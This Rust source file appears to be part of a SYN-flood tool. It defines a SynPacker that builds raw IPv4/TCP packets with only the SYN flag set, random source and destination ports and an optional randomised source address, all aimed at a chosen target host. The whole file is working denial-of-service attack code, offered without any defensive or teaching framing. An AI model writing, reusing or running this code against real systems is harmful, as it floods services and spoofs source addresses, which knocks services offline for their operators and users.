use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::packet::tcp::{MutableTcpPacket, TcpFlags};
use pnet::packet::MutablePacket;
use std::net::Ipv4Addr;

use pnet::util;
use rand::Rng;

use crate::cli::SynArgs;
use crate::flooder::IPV4_HEADER_LEN;

use super::{create_ipv4_packet, Packer};
const TCP_HEADER_LEN: usize = 20;

#[derive(Clone)]
pub struct SynPacker {
  buffer_ip: Vec<u8>,
  buffer: Vec<u8>,
  args: SynArgs,
}

impl SynPacker {
  pub fn init(args: SynArgs) -> Self {
    let buffer = vec![0u8; args.common.size + TCP_HEADER_LEN];
    let buffer_ip = vec![0u8; buffer.len() + IPV4_HEADER_LEN];

    let mut args = args;
    args.src_port = Some(args.src_port.unwrap_or(rand::thread_rng().gen_range(49152..=65535)));

    Self {
      buffer_ip,
      buffer,
      args,
    }
  }
}

impl Packer for SynPacker {
  fn create_packet(&mut self) -> MutableIpv4Packet {
    let tcp_size = self.buffer.len();
    let mut ipv4_packet = create_ipv4_packet(
      &mut self.buffer_ip,
      self.args.common.host,
      IpNextHeaderProtocols::Tcp,
      tcp_size,
      self.args.common.random_source,
    );

    let mut tcp_packet = MutableTcpPacket::new(&mut self.buffer).expect("Error creating tcp packet");
    tcp_packet.set_source(self.args.src_port.unwrap());
    tcp_packet.set_destination(self.args.port.unwrap_or(rand::thread_rng().gen_range(1..49152)));
    tcp_packet.set_sequence(0);
    tcp_packet.set_acknowledgement(0);
    tcp_packet.set_data_offset(5);
    tcp_packet.set_flags(TcpFlags::SYN);
    tcp_packet.set_window(0);
    tcp_packet.set_urgent_ptr(0);
    let checksum = util::checksum(tcp_packet.packet_mut(), 1);
    tcp_packet.set_checksum(checksum);

    ipv4_packet.set_payload(tcp_packet.packet_mut());
    ipv4_packet
  }

  fn get_addr(&self) -> Ipv4Addr {
    self.args.common.host
  }
}
